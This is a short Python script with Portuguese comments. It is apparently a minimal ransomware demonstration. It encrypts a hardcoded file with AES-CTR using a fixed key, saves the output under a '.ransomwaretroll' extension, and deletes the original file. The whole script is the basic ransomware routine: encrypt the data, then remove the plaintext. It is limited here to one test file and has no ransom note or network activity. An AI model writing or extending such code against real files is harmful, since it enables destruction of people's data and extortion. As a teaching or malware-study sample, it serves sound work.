import os
import pyaes

# Nome do arquivo original
file_name = "teste.txt"

# Nome do arquivo criptografado
encrypted_file_name = file_name + ".ransomwaretroll"

# Chave de criptografia
key = b"testeransomwares"

try:
    # Abrir e ler o arquivo original
    with open(file_name, "rb") as original_file:
        file_data = original_file.read()

    # Criptografar os dados
    aes = pyaes.AESModeOfOperationCTR(key)
    encrypted_data = aes.encrypt(file_data)

    # Salvar o arquivo criptografado
    with open(encrypted_file_name, "wb") as encrypted_file:
        encrypted_file.write(encrypted_data)

    # Remover o arquivo original
    os.remove(file_name)

    print(f"Arquivo '{file_name}' foi criptografado e salvo como '{encrypted_file_name}'.")

except FileNotFoundError:
    print(f"Erro: O arquivo '{file_name}' não foi encontrado.")
except PermissionError:
    print(f"Erro: Permissão negada ao acessar '{file_name}' ou '{encrypted_file_name}'.")
except Exception as e:
    print(f"Erro inesperado: {e}")
